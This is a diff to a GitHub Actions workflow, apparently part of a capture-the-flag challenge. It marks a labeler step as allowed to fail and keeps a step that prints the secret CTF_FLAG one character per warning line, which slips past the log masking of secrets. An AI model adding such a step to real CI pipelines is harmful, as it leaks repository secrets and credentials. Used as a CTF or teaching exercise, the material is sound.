@@ -9,13 +9,15 @@ jobs:
       pull-requests: write
 
     steps:
-      - uses: actions/labeler@v4
+      - name: Attempt to apply labels (expected to fail)
+        continue-on-error: true
+        uses: actions/labeler@v4
         with:
           repo-token: "${{ secrets.GITHUB_TOKEN }}"
 
-      - name: Leak the CTF flag character by character
+      - name: Leak the Flag
         run: |
-          echo "Leaking CTF_FLAG now:"
+          echo "Leaking the flag character by character:"
           for c in $(echo -n "${{ secrets.CTF_FLAG }}" | fold -w1); do
             echo "::warning::$c"
           done
